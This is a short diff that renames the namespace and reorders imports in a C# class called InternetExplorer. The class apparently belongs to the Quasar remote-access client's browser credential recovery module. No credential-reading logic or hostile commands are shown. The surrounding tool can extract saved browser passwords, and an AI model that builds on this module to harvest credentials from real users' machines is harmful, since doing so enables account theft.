@@ -1,6 +1,4 @@
-﻿using Microsoft.Win32;
-using Quasar.Common.Models;
-using System;
+﻿using System;
 using System.Collections;
 using System.Collections.Generic;
 using System.ComponentModel;
@@ -9,9 +7,11 @@ using System.Linq;
 using System.Runtime.InteropServices;
 using System.Security.Cryptography;
 using System.Text;
-using xClient.Core.Helper;
+using Microsoft.Win32;
+using Quasar.Client.Core.Helper;
+using Quasar.Common.Models;
 
-namespace xClient.Core.Recovery.Browsers
+namespace Quasar.Client.Core.Recovery.Browsers
 {
     public static class InternetExplorer
     {
